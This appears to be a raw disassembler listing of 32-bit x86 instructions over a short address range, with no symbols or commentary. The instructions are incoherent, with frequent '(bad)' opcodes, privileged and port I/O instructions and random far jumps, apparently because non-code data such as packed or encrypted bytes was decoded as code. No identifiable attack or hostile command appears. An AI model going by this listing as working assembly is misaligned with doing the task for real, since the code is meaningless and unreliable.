  413e16:	xchg   DWORD PTR ds:[esi+0x79],esi
  413e1a:	push   ss
  413e1b:	adc    esp,DWORD PTR [eiz*8-0x6859a559]
  413e22:	mov    ecx,0xbb3c0615
  413e27:	dec    edi
  413e28:	cmp    al,0x5d
  413e2a:	jge    0x413dbb
  413e2c:	inc    ecx
  413e2d:	ds hlt 
  413e2f:	or     dl,BYTE PTR [ebx+0x4bb044fb]
  413e35:	adc    ebp,DWORD PTR [ebx]
  413e37:	mov    cl,0x6e
  413e3a:	xchg   ecx,eax
  413e3b:	push   eax
  413e3c:	data16 or BYTE PTR [edi*2+0x3fbd5e39],dl
  413e44:	dec    eax
  413e45:	mov    bl,0xf2
  413e47:	or     eax,0x6b2bd4c6
  413e4c:	jg     0x413ea5
  413e4e:	cmp    ecx,esp
  413e50:	and    ch,BYTE PTR [eax+ecx*1+0x561fecd7]
  413e57:	lahf   
  413e58:	(bad)  
  413e59:	mov    WORD PTR [esi-0x62],ss
  413e5c:	adc    cl,bl
  413e5e:	mov    esi,0x2834b2f0
  413e63:	adc    DWORD PTR [esi],eax
  413e65:	daa    
  413e66:	in     al,0x4a
  413e68:	push   0x48
  413e6a:	sbb    edx,DWORD PTR [ecx-0x3fb05546]
  413e70:	mov    esp,0x8fa05
  413e75:	bndldx (bad),[edi-0x51]
  413e79:	loopne 0x413e82
  413e7b:	mov    al,0x23
  413e7d:	or     ebp,ebp
  413e7f:	xor    BYTE PTR [ebp-0x3],dl
  413e82:	jp     0x413e28
  413e84:	mov    ecx,DWORD PTR [edi-0x7e]
  413e87:	lock and BYTE PTR [ebp-0x43],0x66
  413e8c:	aaa    
  413e8d:	xlat   BYTE PTR ds:[ebx]
  413e8e:	sbb    ch,BYTE PTR ds:0x3a0d674a
  413e94:	(bad)  
  413e96:	push   esp
  413e97:	lock adc ecx,esp
  413e9a:	cmp    bl,BYTE PTR [esi-0x584bcb66]
  413ea0:	push   ss
  413ea1:	and    DWORD PTR [eax],edx
  413ea3:	ss daa 
  413ea5:	pop    edx
  413ea6:	inc    ebp
  413ea7:	inc    edi
  413ea8:	adc    cl,ah
  413eaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413eab:	aad    0xa3
  413ead:	gs jecxz 0x413e39
  413eb0:	pop    ss
  413eb1:	mov    edi,0x7e03dce2
  413eb6:	inc    ebp
  413eb7:	push   ebp
  413eb8:	add    BYTE PTR cs:[eax+0x215c189b],cl
  413ebf:	iret   
  413ec0:	jge    0x413efc
  413ec2:	mov    dl,0x3c
  413ec4:	xchg   BYTE PTR [ecx+0x2ab5dbc3],al
  413eca:	es mov fs,edi
  413ecd:	cmp    DWORD PTR [ebp-0x1b],edx
  413ed0:	pop    ecx
  413ed1:	es js  0x413e89
  413ed4:	sub    ch,BYTE PTR [esi+0x78]
  413ed7:	adc    ebp,esp
  413ed9:	test   bh,ah
  413edb:	push   0x74
  413edd:	out    0x44,eax
  413edf:	ja     0x413e6e
  413ee1:	(bad)  
  413ee2:	dec    esp
  413ee3:	fisttp QWORD PTR [ebx+0x3e]
  413ee6:	gs ja  0x413ea4
  413ee9:	pop    edx
  413eea:	je     0x413ece
  413eec:	in     al,dx
  413eed:	scas   eax,DWORD PTR es:[edi]
  413eee:	aad    0xeb
  413ef0:	div    DWORD PTR [esi]
  413ef2:	fcmovnu st,st(1)
  413ef4:	(bad)  
  413ef5:	scas   al,BYTE PTR es:[edi]
  413ef6:	shl    DWORD PTR [esp+edx*2-0x68],1
  413efa:	ret    
  413efb:	and    esp,DWORD PTR [edx+0x2bd8557]
  413f01:	mov    ebx,0x9d3f19df
  413f06:	and    eax,0x6cee8ea
  413f0b:	mov    ch,0xa9
  413f0d:	ss xchg edi,eax
  413f0f:	mov    al,ds:0x64a6a3f8
  413f14:	ficomp WORD PTR ds:0xb0050042
  413f1a:	jmp    0x413ed8
  413f1c:	sahf   
  413f1d:	jbe    0x413f6e
  413f1f:	ds pop ebp
  413f21:	xchg   esp,eax
  413f22:	push   es
  413f23:	mov    al,ds:0x608346c5
  413f28:	push   ss
  413f29:	cmp    BYTE PTR [esi],dh
  413f2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f2c:	popf   
  413f2d:	xchg   ecx,eax
  413f2e:	jo     0x413ec2
  413f30:	arpl   di,di
  413f32:	pop    es
  413f33:	out    0x42,al
  413f35:	mov    ecx,0xd5f27a1d
  413f3a:	ins    DWORD PTR es:[edi],dx
  413f3b:	cs call 0x3811:0xd9ecc1d5
  413f43:	mov    WORD PTR [edx+0x18],ss
  413f46:	aad    0xc9
  413f48:	pop    esi
  413f49:	retf   
  413f4a:	inc    ebx
  413f4b:	add    edi,DWORD PTR [eax]
  413f4d:	(bad)  
  413f4e:	aad    0x2f
  413f50:	in     al,0xc0
  413f52:	mov    al,0x5f
  413f54:	inc    ebx
  413f55:	pop    ecx
  413f56:	and    BYTE PTR [ebx+0x7fd85023],dh
  413f5c:	or     BYTE PTR [eax],bh
  413f5e:	push   eax
  413f5f:	pop    edi
  413f60:	xor    al,0xcb
  413f62:	sub    al,0x8c
  413f64:	(bad)  
  413f65:	mov    ah,0x78
  413f67:	xchg   edi,eax
  413f68:	aam    0xc6
  413f6a:	popa   
  413f6b:	jne    0x413f70
  413f6d:	inc    ecx
  413f6e:	push   ebp
  413f6f:	je     0x413fa8
  413f71:	ficomp WORD PTR [ebx-0x422bd827]
  413f77:	add    eax,0xa9766d7
  413f7c:	xor    esp,eax
  413f7e:	fidiv  WORD PTR [ecx]
  413f80:	test   DWORD PTR [ebx-0x15],ebp
  413f83:	retf   0x506a
  413f86:	pop    ss
  413f87:	test   al,0x92
  413f89:	add    eax,0xd4c107af
  413f8e:	shl    BYTE PTR [edx+0x7d],cl
  413f91:	inc    BYTE PTR [ebx+0x4f8273af]
  413f97:	outs   dx,DWORD PTR ds:[esi]
  413f98:	enter  0x6648,0xf5
  413f9c:	xor    eax,DWORD PTR [edx]
  413f9e:	push   es
  413f9f:	in     eax,0xe3
  413fa1:	jle    0x413fec
  413fa3:	sub    edi,ebp
  413fa5:	(bad)  
  413fa6:	mov    WORD PTR [esi+0x24],ds
  413fa9:	scas   al,BYTE PTR es:[edi]
  413faa:	pusha  
  413fab:	test   DWORD PTR [edi+eax*4],edi
  413fae:	pop    ecx
  413faf:	dec    ebp
  413fb0:	push   ebp
  413fb1:	jle    0x41400f
  413fb3:	or     edi,DWORD PTR [ebx-0x46da6959]
  413fb9:	mov    eax,ebp
  413fbb:	lock jg 0x413f47
  413fbe:	gs jmp 0xbb5d:0x3d9e055d
  413fc6:	cmp    al,0x17
  413fc8:	fstp   QWORD PTR [eiz*2+0x3f7e5763]
  413fcf:	retf   0x684c
  413fd2:	out    dx,eax
  413fd3:	das    
  413fd4:	push   0x6b75347
  413fd9:	sub    DWORD PTR [ebx],edx
  413fdb:	jmp    DWORD PTR [esi]
  413fdd:	push   eax
  413fde:	jmp    0x413fe4
  413fe0:	aad    0x25
  413fe2:	mov    DWORD PTR [esi],eax
  413fe4:	test   BYTE PTR [esi-0x10],dl
  413fe7:	pop    ebp
  413fe8:	xchg   esi,eax
  413fe9:	cmp    al,0xb0
  413feb:	push   DWORD PTR [edx+edi*8-0x518b799c]
  413ff2:	pop    edi
  413ff3:	pop    eax
  413ff4:	ret    
  413ff5:	sbb    al,dh
  413ff7:	fwait
  413ff8:	jne    0x414002
  413ffa:	test   al,0xda
  413ffc:	mov    ebx,DWORD PTR [eax+0x54e82d18]
  414002:	pop    ecx
  414003:	xor    BYTE PTR ds:0x8a0892ae,dl
  414009:	adc    esp,ecx
  41400b:	mov    al,ds:0xd9ddca46
  414010:	fcomp  st(1)
  414012:	fmul   st(6),st
  414014:	mov    ss,WORD PTR [esi+0x6ebec4e7]
  41401a:	inc    edi
  41401b:	jae    0x414049
  41401d:	(bad)
  414021:	adc    eax,0xbf84baf3
  414026:	sub    esp,0x2338e587
  41402c:	mov    edx,esi
  41402e:	push   ss
  41402f:	push   ss
  414030:	push   0x47
  414032:	ins    BYTE PTR es:[edi],dx
  414033:	add    BYTE PTR [edi],ah
  414035:	push   es
  414036:	pop    ebx
  414037:	lock and al,0x96
  41403a:	leave  
  41403b:	addr16 dec ebx
  41403d:	test   al,0x1d
  41403f:	fnstcw WORD PTR [ebp+0x29]
  414042:	jae    0x413fd2
  414044:	scas   al,BYTE PTR es:[edi]
  414045:	nop
  414046:	jecxz  0x414099
  414048:	cmp    eax,ecx
  41404a:	in     al,0x92
  41404c:	adc    esp,0xffffff94
  41404f:	mov    cs,edx
  414051:	mov    ebx,0x1b86e957
  414056:	inc    esi
  414057:	adc    eax,0xa1b0f686
  41405c:	pop    ss
  41405d:	mov    ebx,0xd12b4c32
  414062:	lods   eax,DWORD PTR ds:[esi]
  414063:	clc    
  414064:	sbb    dh,BYTE PTR [esi-0x60b55743]
  41406a:	mov    esi,0xdbea599d
  41406f:	add    DWORD PTR ss:[edi-0x4],0xf2710d8a
  414077:	xchg   edi,eax
  414078:	test   al,0xfe
  41407a:	mov    eax,ds:0xd52c5c13
  41407f:	and    dl,BYTE PTR [eax+edi*4-0x61a9c7bb]
  414086:	call   0xcfd1:0x475b6417
  41408d:	or     al,BYTE PTR [ecx-0x7ec95b14]
  414093:	pop    ebp
  414094:	mov    dh,0x5
  414096:	aas    
  414097:	xchg   esp,ecx
  414099:	mov    ecx,edi
  41409b:	xor    BYTE PTR [ecx+ecx*4+0x106d4410],ch
  4140a2:	add    ch,ah
  4140a4:	pop    ebp
  4140a5:	cmp    eax,0xae84cee8
  4140aa:	push   edx
  4140ab:	je     0x4140a0
  4140ad:	push   esp
  4140ae:	dec    esp
  4140af:	pop    eax
  4140b0:	in     eax,0x56
  4140b2:	sbb    bh,dl
  4140b4:	push   0x50
  4140b6:	test   DWORD PTR [edx+0x32],edx
  4140b9:	in     eax,0x11
  4140bb:	xchg   ebx,eax
  4140bc:	push   esp
  4140bd:	add    DWORD PTR [ebp+0x67],eax
  4140c0:	adc    ebp,DWORD PTR [ebx-0x2]
  4140c3:	jmp    FWORD PTR [eax-0x4e]
  4140c6:	outs   dx,DWORD PTR ds:[esi]
  4140c7:	das    
  4140c8:	add    ebp,ebx
  4140ca:	mov    ax,ds:0xd085d04b
  4140d0:	(bad)  
  4140d1:	aaa    
  4140d2:	push   ds
  4140d3:	adc    eax,0x1a4479f5
  4140d8:	sbb    ah,0xc7
  4140db:	pop    eax
  4140dc:	push   eax
  4140dd:	mov    DWORD PTR [edx-0xc],ebp
  4140e0:	retf   0xf1f7
  4140e3:	pop    ds
  4140e4:	clc    
  4140e5:	test   BYTE PTR [eax-0x73],al
  4140e8:	and    DWORD PTR [ebp+eiz*4+0x4e],edx
  4140ec:	cwde   
  4140ed:	ret    0x378c
  4140f0:	lods   eax,DWORD PTR ds:[esi]
  4140f1:	aad    0x9c
  4140f3:	inc    ebp
  4140f4:	mov    ecx,0xd29e4da0
  4140f9:	jl     0x4140c6
  4140fb:	jne    0x41407e
  4140fd:	mov    eax,ds:0x746f79e0
  414102:	xor    esi,edx
  414104:	int3   
  414105:	loope  0x414149
  414107:	sbb    eax,0x4413b842
  41410c:	lea    esi,[ebx+0x523c5297]
  414112:	jle    0x4140e8
  414114:	sub    al,BYTE PTR [esi+ecx*1]
  414117:	aad    0xde
  414119:	mov    ss,WORD PTR [ebx+0x2]
  41411c:	push   cs
  41411d:	jmp    0x8459b69c
  414122:	and    eax,DWORD PTR [ebx-0x62]
  414125:	sti    
  414126:	sub    ah,ah
  414128:	(bad)  
  414129:	xor    DWORD PTR [ebx-0x3f1cc1b],esp
  41412f:	lods   eax,DWORD PTR ds:[esi]
  414130:	sub    ah,0x40
  414133:	sub    DWORD PTR [edi+0x1eb70d59],edx
  414139:	das    
  41413a:	mov    esp,0xc2a36dbb
  41413f:	in     eax,dx
  414140:	mov    al,0xa2
  414142:	xchg   esp,eax
  414143:	xchg   ebx,eax
  414144:	ja     0x4141a7
  414146:	mov    ch,0xd5
  414148:	push   ds
  414149:	hlt    
  41414a:	std    
  41414b:	cdq    
  41414c:	in     al,0xad
  41414e:	imul   edx,DWORD PTR [edi+0x19],0x80a55ded
  414155:	jb     0x4141b0
  414157:	or     ecx,DWORD PTR [edi]
  414159:	xchg   esi,eax
  41415a:	mov    cl,0xc2
  41415c:	pop    ecx
  41415d:	adc    DWORD PTR [edi+0xa],ecx
  414160:	jne    0x41418c
  414162:	nop
  414163:	sahf   
  414164:	dec    eax
  414165:	scas   eax,DWORD PTR es:[edi]
  414166:	cld    
  414167:	stc    
  414168:	fmul   st,st(3)
  41416a:	ins    DWORD PTR es:[edi],dx
  41416b:	push   ecx
  41416c:	add    BYTE PTR [ebx],dl
  41416e:	xor    DWORD PTR [edi-0x7],edi
  414171:	int3   
  414172:	mov    eax,0x28ddbfc5
  414177:	jl     0x414194
  414179:	mov    al,0x9c
  41417b:	(bad)  
  41417c:	push   ecx
  41417d:	mov    eax,DWORD PTR [ebp-0x7b]
  414180:	ret    
  414181:	jns    0x414189
  414183:	ret    
  414184:	test   DWORD PTR [ecx+0x53cafb43],esp
  41418a:	gs (bad) 
  41418c:	scas   eax,DWORD PTR es:[edi]
  41418d:	cdq    
  41418e:	fmulp  st(1),st
  414190:	lds    eax,FWORD PTR [ecx]
  414192:	push   ecx
  414193:	sbb    eax,0x5a3d1e76
  414198:	(bad)  
  414199:	dec    ebp
  41419a:	inc    ecx
  41419b:	mov    bh,0xed
  41419d:	int3   
  41419e:	mov    ds:0x43baec78,al
  4141a3:	pop    es
  4141a4:	icebp  
  4141a5:	pushf  
  4141a6:	retf   
  4141a7:	push   cs
  4141a8:	inc    ebx
  4141a9:	xor    BYTE PTR [edi-0x4cb28444],dh
  4141af:	fwait
  4141b0:	mov    bl,0x65
  4141b2:	mov    cs,esi
  4141b4:	xor    ch,ch
  4141b6:	enter  0x43ff,0xc8
  4141ba:	clts   
  4141bc:	push   edi
  4141bd:	or     al,0x89
  4141bf:	adc    al,0xe3
  4141c1:	test   al,0x10
  4141c3:	mov    ds:0xfc0aa2fb,eax
  4141c8:	test   eax,0xfaf9233b
  4141cd:	sub    ecx,DWORD PTR [ebx+0x229e81c4]
  4141d3:	or     cl,ah
  4141d5:	mov    ecx,0xe843f1b4
  4141da:	xor    eax,0x2ef9b98b
  4141df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141e0:	mov    eax,0xb5be6beb
  4141e5:	test   BYTE PTR [edx],bh
  4141e7:	nop
  4141e8:	adc    al,0xc3
  4141ea:	test   BYTE PTR [ecx+0x2e],cl
  4141ed:	mov    ch,0x74
  4141ef:	ins    DWORD PTR es:[edi],dx
  4141f0:	clc    
  4141f1:	push   cs
  4141f2:	add    bh,cl
  4141f4:	or     dl,BYTE PTR [eax]
  4141f6:	(bad)  
  4141f7:	mov    ebp,esi
  4141f9:	pusha  
  4141fa:	data16 sub ch,cl
  4141fd:	aaa    
  4141fe:	inc    esp
  4141ff:	dec    edx
  414200:	invd   
  414202:	dec    edx
  414203:	mov    esi,0xf9f6bb99
  414208:	mov    ah,0xaa
  41420a:	int3   
  41420b:	sub    DWORD PTR [esp+ebx*8-0x52],ebx
  41420f:	mov    cl,0x5b
  414211:	cmc    
  414212:	mov    edi,0x3ede2dea
  414217:	outs   dx,DWORD PTR ds:[esi]
  414218:	popf   
  414219:	and    edx,DWORD PTR [edi-0x26]
  41421c:	push   es
  41421d:	mov    esp,0xf0283ea6
  414222:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414223:	test   BYTE PTR [edi],bh
  414225:	adc    eax,0xd1a3c412
  41422a:	(bad)  
  41422b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41422c:	int    0xb1
  41422e:	or     cl,BYTE PTR [ebx-0x7]
  414231:	jo     0x4142b2
  414233:	frstor ds:0x2c2eafd7
  414239:	lods   al,BYTE PTR ds:[esi]
  41423a:	repz inc bx
  41423d:	and    ecx,eax
  41423f:	push   eax
  414240:	and    BYTE PTR [edx+eiz*2],0x5
  414244:	mov    dl,0xdb
  414246:	test   DWORD PTR [ebx+0x4724104],0x90f6ee25
  414250:	pop    eax
  414251:	test   DWORD PTR [eax-0x75f7eee0],ecx
  414257:	push   0xffffffe7
  414259:	dec    esi
  41425a:	push   ecx
  41425b:	popf   
  41425c:	pop    esi
  41425d:	cmp    DWORD PTR [edi+edi*2],esp
  414260:	out    dx,eax
  414261:	loope  0x414226
  414263:	popa   
  414264:	or     DWORD PTR [esi+0x1e],edx
  414267:	push   esi
  414268:	adc    al,0xb6
  41426a:	sub    eax,0x839280f9
  41426f:	mov    ds:0x8644ca2,eax
  414274:	addr16 aad 0x35
  414277:	push   es
  414278:	push   ds
  414279:	into   
  41427a:	(bad)  
  41427b:	scas   al,BYTE PTR es:[edi]
  41427c:	nop
  41427d:	(bad)  
  41427e:	fcmovu st,st(6)
  414280:	xchg   ecx,eax
  414281:	fwait
  414282:	jnp    0x4142dc
  414284:	sti    
  414285:	int3   
  414286:	(bad)  
  414287:	adc    al,0xe
  414289:	pusha  
  41428a:	cmp    BYTE PTR [esi],bh
  41428c:	int    0x35
  41428e:	(bad)  [ebx]
  414290:	fs add al,0x91
  414293:	jge    0x4142d9
  414295:	shl    edi,cl
  414297:	pushf  
  414298:	jmp    0x414252
  41429a:	jmp    0x4142e5
  41429c:	call   0xb3c:0xc6a36703
  4142a3:	cmp    eax,0xbc9eebb9
  4142a8:	mov    dl,bh
  4142aa:	mov    dh,0x1d
  4142ac:	stos   BYTE PTR es:[edi],al
  4142ad:	data16 into 
  4142af:	dec    esp
  4142b0:	mov    ch,0xc9
  4142b2:	sbb    esi,DWORD PTR [ebx]
  4142b4:	cmp    DWORD PTR [ebx],ecx
  4142b6:	push   esi
  4142b7:	jo     0x414275
  4142b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142ba:	fwait
  4142bb:	jbe    0x41426d
  4142bd:	and    DWORD PTR [edx],ebp
  4142bf:	xchg   esp,eax
  4142c0:	cwde   
  4142c1:	jo     0x4142d6
  4142c3:	sub    eax,0xf45c6e92
  4142c8:	mov    cl,0x1f
  4142ca:	xor    BYTE PTR [ebp+0x4a62cd60],dl
  4142d0:	data16 arpl WORD PTR [ecx-0x36],di
  4142d4:	xor    cl,ah
  4142d6:	pushf  
  4142d7:	aad    0x2b
  4142d9:	popa   
  4142da:	retf   
  4142db:	jge    0x414298
  4142dd:	mov    ch,0x2b
  4142df:	and    ebx,ebp
  4142e1:	ror    BYTE PTR [ebp-0x77],0x1c
  4142e5:	iret   
  4142e6:	jo     0x4142dd
  4142e8:	xchg   edi,eax
  4142e9:	jg     0x41434b
  4142eb:	scas   eax,DWORD PTR es:[edi]
  4142ec:	fdivr  QWORD PTR [ecx+esi*8+0x478b20ae]
  4142f3:	add    cl,bl
  4142f5:	pop    eax
  4142f6:	fnstcw WORD PTR [esi]
  4142f8:	fs jge 0x41433e
  4142fb:	mov    bl,0x8c
  4142fd:	or     cl,ch
  4142ff:	push   ebp
  414300:	dec    ecx
  414301:	jmp    0xfce75cd2
  414306:	loope  0x414292
  414308:	out    0x17,al
  41430a:	nop
  41430b:	or     ebp,esi
  41430d:	cmp    edx,DWORD PTR ds:[ebx]
  414310:	jg     0x414301
  414312:	mov    bh,0x91
  414314:	pusha  
  414315:	pop    esp
  414316:	push   esp
  414317:	mov    ch,BYTE PTR [edx+0x665f3286]
  41431d:	mov    al,ds:0x37e305aa
  414322:	push   cs
  414323:	sbb    al,0x8d
  414325:	pop    ebx
  414326:	push   ebp
  414327:	shl    edx,1
  414329:	repnz add bh,al
  41432c:	xchg   ebp,eax
  41432d:	js     0x414326
  41432f:	push   ebp
  414330:	xchg   DWORD PTR [ecx-0x68],ecx
  414333:	neg    edx
  414335:	lock inc esi
  414337:	and    al,0xda
  414339:	sub    DWORD PTR [ecx+0x68f0810e],0x4f28b578
  414343:	push   ss
  414344:	mov    edi,DWORD PTR ds:0x33dfd141
  41434a:	add    DWORD PTR [esi],esp
  41434c:	int3   
  41434d:	call   0x64a5:0x62d0592a
  414354:	(bad)  
  414356:	adc    DWORD PTR [edx],edx
  414358:	and    esi,DWORD PTR [ebp+0x1831bf46]
  41435e:	(bad)  
  41435f:	out    dx,eax
  414360:	inc    edi
  414361:	add    bl,BYTE PTR [bx+di]
  414364:	adc    DWORD PTR [edx],edi
  414366:	imul   eax,DWORD PTR [ebx-0x7ff0e0c6],0x8e61d670
  414370:	imul   esi,DWORD PTR [ebx+0x2f],0xffffff90
  414374:	(bad)  
  414375:	aad    0xb2
  414377:	fild   DWORD PTR [eax+0x50]
  41437a:	in     eax,0xf5
  41437c:	gs push es
  41437e:	scas   eax,DWORD PTR es:[edi]
  41437f:	mov    ch,0x6
  414381:	outs   dx,DWORD PTR ds:[esi]
  414382:	jb     0x4143d7
  414384:	pusha  
  414385:	mov    edi,0xfddfaed0
  41438a:	dec    edx
  41438b:	test   eax,0xfa737d
  414390:	inc    ebp
  414391:	sti    
  414392:	mov    ds:0xf1906e96,eax
  414397:	pop    ds
  414398:	into   
  414399:	push   eax
  41439a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41439b:	mov    al,ds:0xfac22007
  4143a0:	sbb    ch,dh
  4143a2:	xchg   edi,eax
  4143a3:	mov    eax,ds:0x162fabf1
  4143a8:	and    DWORD PTR [edi+edi*8+0x6b],ebx
  4143ac:	enter  0x29da,0xc
  4143b0:	repz cs cmp ebx,esp
  4143b4:	xchg   ebx,eax
  4143b5:	adc    BYTE PTR [ebp-0x6c],0x8a
  4143b9:	pop    ebx
  4143ba:	adc    dh,BYTE PTR [edi]
  4143bc:	mov    ebp,0xd96c4260
  4143c1:	jae    0x414372
  4143c3:	sub    bl,dh
  4143c5:	xor    al,0x34
  4143c7:	and    BYTE PTR [eax+eax*4-0x76],al
  4143cb:	aaa    
  4143cc:	call   0xa6f4:0xc2daf495
  4143d3:	jae    0x414444
  4143d5:	adc    ecx,DWORD PTR [esi+0x55]
  4143d8:	jge    0x4143a8
  4143da:	add    DWORD PTR [ebx-0x11],eax
  4143dd:	jecxz  0x41441b
  4143df:	push   ebp
  4143e0:	frstor [ebx+0x6070706a]
  4143e6:	or     bl,BYTE PTR [esi-0x26e2c86a]
  4143ec:	in     eax,dx
  4143ed:	clc    
  4143ee:	fild   QWORD PTR [edi+0x2b]
  4143f1:	cld    
  4143f2:	push   ecx
  4143f3:	cld    
  4143f4:	push   ebx
  4143f5:	scas   eax,DWORD PTR es:[edi]
  4143f6:	add    eax,0x6452594d
  4143fb:	push   0x6d
  4143fd:	pop    es
  4143fe:	or     BYTE PTR [ebp+0x199dccbe],bl
  414404:	mov    dl,0xc9
  414406:	and    cl,BYTE PTR [eax+0x2c80882d]
  41440c:	xchg   ecx,eax
  41440d:	add    eax,0x926aee8f
  414412:	inc    esp
  414413:	mov    bh,0xff
  414415:	sahf   
  414416:	dec    eax
  414417:	mov    al,ds:0x3c5a0f2a
  41441c:	dec    edx
  41441d:	lds    ecx,FWORD PTR [ebx]
  41441f:	test   BYTE PTR [eax+0x13fd8d5b],dh
  414425:	imul   BYTE PTR [ebx+eax*1]
  414428:	dec    edi
  414429:	int3   
  41442a:	rol    DWORD PTR [edx],1
  41442c:	or     esp,DWORD PTR [eax-0x72]
  41442f:	jle    0x41446b
  414431:	or     edx,DWORD PTR [edx-0x64]
  414434:	mov    DWORD PTR [edi],edx
  414436:	mov    ds:0xe998f26b,eax
  41443b:	clc    
  41443c:	push   0xffffff9b
  41443e:	pop    ebp
  41443f:	popf   
  414440:	test   cl,ah
  414442:	add    al,0xd1
  414444:	sbb    bh,ch
  414446:	dec    ebp
  414447:	sbb    ah,ch
  414449:	iret   
  41444a:	add    DWORD PTR [edx],eax
  41444c:	arpl   ax,di
  41444e:	sub    eax,0xb5ef9287
  414453:	xor    eax,0x4cf51e20
  414458:	sbb    eax,0x9064dd81
  41445d:	sahf   
  41445e:	fs xchg esp,eax
  414460:	jp     0x414428
  414462:	shr    DWORD PTR ds:0x989bafa3,1
  414468:	mov    dh,0x3b
  41446a:	dec    ebx
  41446b:	mov    edx,0x6a5f559c
  414470:	and    dh,BYTE PTR [ebx+edi*8-0x6b]
  414474:	aas    
  414475:	xor    al,0xdf
  414477:	sbb    DWORD PTR [ebx-0x62e13266],edi
  41447d:	inc    esi
  41447e:	push   0x7b2fb77e
  414483:	mov    ebx,0xbdc630af
  414488:	mov    ecx,0xdf61426d
  41448d:	mov    ds:0xdceea6a3,eax
  414492:	rcl    BYTE PTR [edi],1
  414494:	add    DWORD PTR [edx],ebx
  414496:	pop    ebx
  414497:	xor    bh,BYTE PTR [edx-0x1]
  41449a:	xchg   DWORD PTR [ebp+0x21],eax
  41449d:	pop    esp
  41449e:	mov    eax,ds:0xd8fcd9db
  4144a3:	test   al,0x8
  4144a5:	es in  eax,0xea
  4144a8:	dec    ebx
  4144a9:	inc    ecx
  4144aa:	mov    al,ds:0xb7185a4e
  4144af:	stos   BYTE PTR es:[di],al
  4144b1:	pop    esp
  4144b2:	cld    
  4144b3:	fst    QWORD PTR [ecx]
  4144b5:	and    edx,DWORD PTR [edx+0x2c81518b]
  4144bb:	repnz in al,dx
  4144bd:	pop    ss
  4144be:	test   al,0x33
  4144c0:	in     al,dx
  4144c1:	jg     0x4144f5
  4144c3:	or     BYTE PTR [ebp+0x5893cad7],dh
  4144c9:	rol    al,1
  4144cb:	sbb    eax,0x4f4194c5
  4144d0:	call   0xbc1c:0x4f2d797a
  4144d7:	push   ecx
  4144d8:	test   eax,0x245f5e5e
  4144dd:	test   al,0xb2
  4144df:	and    cl,BYTE PTR [ecx+0xa2ca4a8]
  4144e5:	mov    ds:0xee4d1a15,eax
  4144ea:	out    dx,eax
  4144eb:	dec    eax
  4144ec:	scas   eax,DWORD PTR es:[edi]
  4144ed:	je     0x414546
  4144ef:	sub    eax,0x6acf452f
  4144f4:	and    al,0x3f
  4144f6:	ss push 0xffffff87
  4144f9:	xchg   ecx,eax
  4144fa:	cmc    
  4144fb:	cwde   
  4144fc:	jbe    0x41456e
  4144fe:	jp     0x41454e
  414500:	xchg   ecx,eax
  414501:	push   ecx
  414502:	loop   0x41449c
  414504:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414505:	test   al,0xdc
  414507:	test   BYTE PTR [esi+0xa165967],bl
  41450d:	cli    
  41450e:	cmc    
  41450f:	and    eax,0xbe360e19
  414514:	fstp   DWORD PTR [ebx+0x45]
  414517:	sbb    dl,ah
  414519:	push   eax
  41451a:	pop    ds
  41451b:	dec    esp
  41451c:	adc    bh,ch
  41451e:	add    eax,DWORD PTR [edi]
  414520:	outs   dx,DWORD PTR ds:[esi]
  414521:	push   esp
  414522:	sbb    BYTE PTR [esi-0x7beaf282],al
  414528:	sbb    DWORD PTR [edx-0x34685088],ecx
  41452e:	cwde   
  41452f:	add    eax,DWORD PTR [ebx]
  414531:	jae    0x414572
  414533:	in     eax,dx
  414534:	scas   eax,DWORD PTR es:[edi]
  414535:	dec    edi
  414536:	pop    edi
  414537:	push   esi
  414538:	dec    ebp
  414539:	push   esi
  41453a:	repz loope 0x41455f
  41453d:	cmc    
  41453e:	mov    esp,0xc63c9923
  414543:	jecxz  0x41450c
  414545:	push   0xffffffa1
  414547:	fiadd  DWORD PTR [ebx-0x3d]
  41454a:	outs   dx,BYTE PTR ds:[esi]
  41454c:	push   ecx
  41454d:	xor    eax,0xe37d227e
  414552:	lods   al,BYTE PTR ds:[esi]
  414553:	push   ebx
  414554:	or     al,0xbe
  414556:	test   eax,0x3c6ce5be
  41455b:	cld    
  41455c:	test   esp,eax
  41455e:	xchg   ecx,eax
  41455f:	ins    BYTE PTR es:[edi],dx
  414560:	in     al,0x5e
  414562:	loope  0x41456d
  414564:	xchg   ebx,eax
  414565:	mov    ds:0x304e4c13,eax
  41456a:	jb     0x414510
  41456c:	or     esp,esi
  41456e:	ret    0x7618
  414571:	mov    ds:0x342597b3,al
  414576:	fiadd  DWORD PTR [edi+0x1d]
  414579:	arpl   WORD PTR [edx],cx
  41457b:	add    ch,BYTE PTR [edx-0x36]
  41457e:	jmp    0x4145e0
  414580:	icebp  
  414581:	push   edi
  414582:	mov    dl,0xe9
  414584:	test   al,0xa3
  414586:	add    al,0xcd
  414588:	imul   edi,edi,0x75c553ab
  41458e:	outs   dx,DWORD PTR ds:[esi]
  41458f:	jmp    FWORD PTR [ecx-0x18]
  414592:	outs   dx,BYTE PTR ds:[esi]
  414593:	xchg   edx,eax
  414594:	test   DWORD PTR [esi+eax*8+0x46],ebp
  414598:	and    al,0x8
  41459a:	mov    BYTE PTR [ebx-0x2e],0xab
  41459e:	rcl    eax,1
  4145a0:	stc    
  4145a1:	loopne 0x4145d6
  4145a3:	int3   
  4145a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145a5:	test   al,0xa1
  4145a7:	push   ebx
  4145a8:	jp     0x414597
  4145aa:	jge    0x414542
  4145ac:	jns    0x4145e2
  4145ae:	fdivr  QWORD PTR [ebx+0x3a426778]
  4145b4:	jl     0x41460b
  4145b6:	cmp    eax,0x4c23ebf3
  4145bb:	jp     0x41462b
  4145bd:	adc    eax,0x2785547f
  4145c2:	int3   
  4145c3:	push   esi
  4145c4:	cli    
  4145c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145c6:	cld    
  4145c7:	repz shr DWORD PTR [ecx-0x92567a3],cl
  4145ce:	outs   dx,DWORD PTR ds:[esi]
  4145cf:	mov    ds:0xcd084c64,eax
  4145d4:	jmp    0x414623
  4145d6:	adc    al,BYTE PTR [ebx+0x3b367a24]
  4145dc:	inc    ecx
  4145dd:	es mov al,0xa4
